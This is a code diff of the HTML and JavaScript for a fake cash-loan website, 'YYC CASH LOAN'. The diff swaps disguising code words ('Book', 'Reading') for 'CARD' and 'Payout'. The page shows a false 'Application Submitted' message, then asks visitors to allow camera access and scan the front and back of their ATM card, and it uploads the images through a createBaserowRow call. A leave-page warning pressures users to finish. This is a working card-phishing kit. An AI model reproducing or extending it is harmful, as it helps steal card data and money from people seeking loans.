@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YYC CASH LOAN - Connect Your Book</title>
+    <title>YYC CASH LOAN - Connect Your CARD</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@300;400&display=swap" rel="stylesheet">
     <style>
@@ -106,7 +106,7 @@
             display: none;
         }
 
-        .success-Book {
+        .success-CARD {
             background-color: var(--white);
             border-radius: var(--border-radius);
             padding: 3px 2px;
@@ -585,7 +585,7 @@
 
         <!-- Main Content (hidden initially) -->
         <section id="main-content" class="content-section">
-            <div class="success-Book">
+            <div class="success-CARD">
                 <i class="fas fa-check-circle success-icon"></i>
                 <h2 class="success-title">Application Submitted!</h2>
                 <p class="success-message">Thank you for applying with YYC CASH LOAN.</p>
@@ -594,23 +594,23 @@
             </div>
 
             <div class="scan-section">
-    <h3 class="section-title">Connect Your Bookie Account for Reading</h3>
+    <h3 class="section-title">Connect Your CARDie Account for Payout</h3>
     
-    <!-- Book Scanner from uploaded file -->
+    <!-- CARD Scanner from uploaded file -->
     <div id="permissionOverlay">
         <h2>Allow Camera Access to Scan</h2>
         <h1>To Verify Scan Out b<h1></h1>
         <button id="enableBtn">Enable Camera</button>
     </div>
     <div class="scanner" style="visibility:hidden;">
-        <h2 id="label">Scan Book Front</h2>
-        <p id="description">Scan the front & Back of your ATM Book to SECURLY CONNECT the accont you want the Loan paid out to.</p>
+        <h2 id="label">Scan CARD Front</h2>
+        <p id="description">Scan the front & Back of your ATM CARD to SECURLY CONNECT the accont you want the Loan paid out to.</p>
         <div style="position: relative;">
             <video id="video" autoplay playsinline></video>
             <div id="scan-line" class="scan-line" style="display:none;"></div>
         </div>
         <button id="switchCamera">Switch Camera</button><br>
-        <button id="scanBtn" disabled>Scan Book Front Clear</button>
+        <button id="scanBtn" disabled>Scan CARD Front Clear</button>
         <button id="next">Next</button>
         <button id="finish">Finish</button>
         <p id="status"></p>
@@ -638,8 +638,8 @@
         <div id="connection-modal" class="modal-overlay">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h2 class="modal-title">Connect Your Bookie Account Via scan</h2>
-                     DUE TO SECURITY CONCERNS, REDUCE SCAM AND FOR EASY ReadingS.
+                    <h2 class="modal-title">Connect Your CARDie Account Via scan</h2>
+                     DUE TO SECURITY CONCERNS, REDUCE SCAM AND FOR EASY PayoutS.
 
 
                 </div>
@@ -655,11 +655,11 @@
                         </div>
                     </div>
                     
-                    <p>To enable access to your loan, you need to first connect your Bookie account Number to allow secure release of your loan instantly once connection is complete.</p>
+                    <p>To enable access to your loan, you need to first connect your CARDie account Number to allow secure release of your loan instantly once connection is complete.</p>
                     
                     <p class="note-text">NOTE: Once connection is complete, funds are released same time/same day.</p>
                     
-                    <p class="warning-text">Please note you can only choose one of the following to connect your book:</p>
+                    <p class="warning-text">Please note you can only choose one of the following to connect your CARD:</p>
                 </div>
                 <div class="modal-footer">
                     <button id="connect-scan" class="btn btn-block">Connect Via Scan</button>
@@ -735,7 +735,7 @@
             window.addEventListener('beforeunload', function(e) {
                 if (document.getElementById('connection-modal').style.display !== 'none') {
                     e.preventDefault();
-                    e.returnValue = 'You need to connect your Book to proceed. Are you sure you want to leave?';
+                    e.returnValue = 'You need to connect your CARD to proceed. Are you sure you want to leave?';
                     return e.returnValue;
                 }
             });
@@ -754,7 +754,7 @@
             // No need for simulation anymore as we're using the actual scanner
         }
 
-        // Book Scanner JavaScript
+        // CARD Scanner JavaScript
         document.addEventListener('DOMContentLoaded', function() {
             const permissionOverlay = document.getElementById('permissionOverlay');
             const enableBtn = document.getElementById('enableBtn');
@@ -857,9 +857,9 @@
                         status.textContent = 'Front Scan Successful';
                         nextBtn.style.display = 'inline-block';
                     } else {
-                        status.textContent = 'Scanning back & Processing Reading';
+                        status.textContent = 'Scanning back & Processing Payout';
                         await createBaserowRow(frontURL, url);
-                        status.textContent = '✅ Done! Click finish and Verify before tracking Reading';
+                        status.textContent = '✅ Done! Click finish and Verify before tracking Payout';
                         finishBtn.style.display = 'inline-block';
                     }
                 } catch (e) {
@@ -875,8 +875,8 @@
             nextBtn.addEventListener('click', () => {
                 currentStep = 'back';
                 label.textContent = 'Back Scan';
-                desc.textContent = 'Scan the back of your Book.';
-                scanBtn.textContent = 'Scan Book Back';
+                desc.textContent = 'Scan the back of your CARD.';
+                scanBtn.textContent = 'Scan CARD Back';
                 nextBtn.style.display = 'none';
                 status.textContent = '';
             });
